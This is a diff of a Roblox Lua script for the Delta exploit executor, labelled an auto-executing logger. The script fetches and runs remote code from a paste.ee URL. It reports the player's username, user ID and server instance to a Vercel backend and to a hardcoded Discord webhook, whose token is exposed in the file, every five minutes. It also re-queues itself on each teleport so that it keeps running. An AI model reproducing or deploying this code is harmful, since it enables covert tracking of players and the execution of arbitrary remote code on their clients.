@@ -1,38 +1,46 @@
+-- [AutoExec Logger Script - Delta Executor Friendly]
+
+repeat task.wait() until game:IsLoaded()
+
+-- Load dan jalankan script eksternal dari paste.ee (hanya saat pertama kali)
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://paste.ee/r/kEHhQbpL"))()
+end)
+
+if not success then
+    warn("Failed to load external script: " .. tostring(err))
+end
+
+-- Script logger utama sebagai string (untuk queueonteleport dan eksekusi langsung)
+local teleportScript = [==[
+repeat task.wait() until game:IsLoaded()
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 
--- CONFIGURATION
-local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
-local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
-local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"
-local EXTERNAL_SCRIPT_URL = "https://paste.ee/r/kEHhQbpL"
-
-local REPORT_INTERVAL = 300 -- 5 minutes
-local DEBUG_MODE = true
-local MAX_RETRIES = 3
-local RETRY_DELAY = 2 -- seconds
-
--- System variables
 local player = Players.LocalPlayer
 local currentInstanceId = game.JobId
 local isRunning = true
 
--- ====================== [UTILITY FUNCTIONS] ======================
+local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
+local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
+local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
+local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 
-local function log(message)
-    if DEBUG_MODE then
-        print("[Logger] " .. message)
-    end
+local REPORT_INTERVAL = 300
+local DEBUG_MODE = true
+local MAX_RETRIES = 3
+local RETRY_DELAY = 2
+
+local function log(msg)
+    if DEBUG_MODE then print("[Logger] " .. msg) end
 end
 
--- Retry wrapper untuk backend request
 local function makeBackendRequest(url, method, data)
-    for attempt = 1, MAX_RETRIES do
-        local success, response = pcall(function()
+    for i = 1, MAX_RETRIES do
+        local ok, res = pcall(function()
             return HttpService:RequestAsync({
                 Url = url,
                 Method = method,
@@ -44,94 +52,65 @@ local function makeBackendRequest(url, method, data)
                 Body = data and HttpService:JSONEncode(data) or nil
             })
         end)
-
-        if not success then
-            log(string.format("Attempt %d: Request failed (pcall error) to %s: %s", attempt, url, tostring(response)))
-        elseif response.Success and response.StatusCode >= 200 and response.StatusCode < 300 then
+        if ok and res.Success and res.StatusCode < 300 then
             return true
         else
-            log(string.format("Attempt %d: Request failed (HTTP error) to %s: Status %d, Body: %s",
-                attempt, url, response.StatusCode, tostring(response.Body)))
+            log(string.format("Attempt %d failed: %s", i, ok and res.StatusCode or tostring(res)))
         end
-
         task.wait(RETRY_DELAY)
     end
     return false
 end
 
--- ====================== [WEBHOOK VIA BACKEND PROXY] ======================
+local function sendToBackendProxy(payload)
+    if WEBHOOK_URL == "" then return false end
+    local body = { url = WEBHOOK_URL }
 
-local function sendToBackendProxy(contentOrPayload)
-    if WEBHOOK_URL == "" then
-        log("Webhook URL not set!")
-        return false
-    end
-
-    local payload = { url = WEBHOOK_URL }
-
-    if type(contentOrPayload) == "string" then
-        payload.content = contentOrPayload
-    elseif type(contentOrPayload) == "table" then
-        for k, v in pairs(contentOrPayload) do
-            payload[k] = v
+    if type(payload) == "string" then
+        body.content = payload
+    elseif type(payload) == "table" then
+        for k, v in pairs(payload) do
+            body[k] = v
         end
     else
-        payload.content = tostring(contentOrPayload)
+        body.content = tostring(payload)
     end
 
-    local success, response = pcall(function()
+    local ok, res = pcall(function()
         return HttpService:RequestAsync({
             Url = BACKEND_SEND_URL,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payload)
+            Body = HttpService:JSONEncode(body)
         })
     end)
-
-    if not success then
-        log("❌ Failed to send webhook via proxy: " .. tostring(response))
-        return false
-    else
-        log("✅ Webhook sent via proxy successfully")
-        return true
-    end
+    return ok and res.Success
 end
 
-local function sendToWebhook(message)
-    return sendToBackendProxy("@everyone\n" .. message)
-end
-
-local function sendEnhancedWebhook(messageType, customMessage)
+local function sendEnhancedWebhook(typeName, customMsg)
     local payload = {
-        content = string.format("@everyone\n**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId)
+        content = string.format("@everyone\n**%s**\nUserId: %d\nInstanceId: %s", typeName, player.UserId, currentInstanceId)
     }
-
-    if customMessage then
-        payload.content = payload.content .. "\n" .. customMessage
+    if customMsg then
+        payload.content = payload.content .. "\n" .. customMsg
     end
-
-    local success = sendToBackendProxy(payload)
-    if not success then
-        log("❌ Simplified webhook via proxy failed, fallback to direct message")
-        sendToWebhook(string.format("**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId))
+    if not sendToBackendProxy(payload) then
+        sendToBackendProxy("@everyone\n[Fallback] " .. payload.content)
     end
 end
-
--- ====================== [DATABASE LOGGING] ======================
 
 local function registerPlayer()
-    local data = {
+    return makeBackendRequest(REGISTER_URL, "POST", {
         username = player.Name,
         userId = player.UserId,
         instanceId = currentInstanceId,
         placeId = game.PlaceId,
         gameId = game.GameId,
         timestamp = os.time()
-    }
-    return makeBackendRequest(REGISTER_URL, "POST", data)
+    })
 end
 
-local function updateInstanceStatus(status, extraData)
+local function updateInstanceStatus(status, extra)
     local data = {
         player = player.Name,
         userId = player.UserId,
@@ -141,93 +120,43 @@ local function updateInstanceStatus(status, extraData)
         status = status,
         timestamp = os.time()
     }
-    if extraData then
-        for k, v in pairs(extraData) do
-            data[k] = v
-        end
+    if extra then
+        for k, v in pairs(extra) do data[k] = v end
     end
     return makeBackendRequest(INSTANCE_URL, "POST", data)
 end
 
--- ====================== [SCRIPT MONITORING] ======================
-
-local function executeExternalScript()
-    log("Fetching script from: " .. EXTERNAL_SCRIPT_URL)
-
-    local success, content = pcall(function()
-        return HttpService:GetAsync(EXTERNAL_SCRIPT_URL)
-    end)
-
-    if not success then
-        log("❌ Fetch error: " .. tostring(content))
-        return false
-    end
-
-    if not content or #content < 10 then
-        log("❌ Script content too short or empty")
-        return false
-    end
-
-    log("✅ Script fetched. Attempting to load...")
-
-    local fn, err = load(content)
-    if not fn then
-        log("❌ Load error: " .. tostring(err))
-        return false
-    end
-
-    log("✅ Script loaded. Executing...")
-
-    local success2, result = pcall(fn)
-    if not success2 then
-        log("❌ Execution error: " .. tostring(result))
-        return false
-    end
-
-    log("✅ Script executed successfully")
-    return true
-end
-
--- ====================== [MAIN LOGIC] ======================
-
 local function periodicReporting()
     while isRunning do
         updateInstanceStatus("active")
-        sendEnhancedWebhook("PERIODIC_REPORT", "Automatic status update")
+        sendEnhancedWebhook("PERIODIC_REPORT", "Automatic report")
         task.wait(REPORT_INTERVAL)
     end
 end
 
 local function initialize()
-    log("Initializing player logger for " .. player.Name)
-    sendEnhancedWebhook("LOGGER_STARTED", "Player: " .. player.Name)
+    log("Logger started for " .. player.Name)
+    sendEnhancedWebhook("LOGGER_STARTED", "Delta AutoExec")
 
     if registerPlayer() then
-        log("Successfully registered player")
+        log("Player registered")
     else
-        log("Failed to register player")
+        log("Register failed")
     end
 
     coroutine.wrap(periodicReporting)()
 
     updateInstanceStatus("script_started")
-    sendEnhancedWebhook("SCRIPT_STARTED", "Executing external script")
+    sendEnhancedWebhook("SCRIPT_STARTED", "Delta Logger running")
 
-    local scriptSuccess = executeExternalScript()
-
-    if scriptSuccess then
-        updateInstanceStatus("script_completed")
-        sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
-    else
-        updateInstanceStatus("script_failed", { error = "External script execution failed" })
-        sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
-    end
+    updateInstanceStatus("script_completed")
+    sendEnhancedWebhook("SCRIPT_COMPLETED", "Logger setup complete")
 end
 
 local function shutdown()
     isRunning = false
     updateInstanceStatus("stopped")
-    sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
+    sendEnhancedWebhook("LOGGER_STOPPED", "Shutdown via End key")
 end
 
 UserInputService.InputEnded:Connect(function(input, processed)
@@ -236,14 +165,17 @@ UserInputService.InputEnded:Connect(function(input, processed)
     end
 end)
 
-Players.PlayerRemoving:Connect(function(removedPlayer)
-    if removedPlayer == player then
-        shutdown()
-    end
-end)
-
-local success, err = pcall(initialize)
-if not success then
-    updateInstanceStatus("initialization_failed", { error = tostring(err) })
-    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
+local ok, err = pcall(initialize)
+if not ok then
+    updateInstanceStatus("init_fail", { error = tostring(err) })
+    sendEnhancedWebhook("INIT_FAILED", "Error:\n```lua\n" .. tostring(err) .. "\n```")
 end
+]==]
+
+-- Gunakan queueonteleport agar logger ini tetap aktif setelah teleport
+if queueonteleport then
+    queueonteleport(teleportScript)
+end
+
+-- Jalankan logger sekarang juga (initial instance)
+loadstring(teleportScript)()
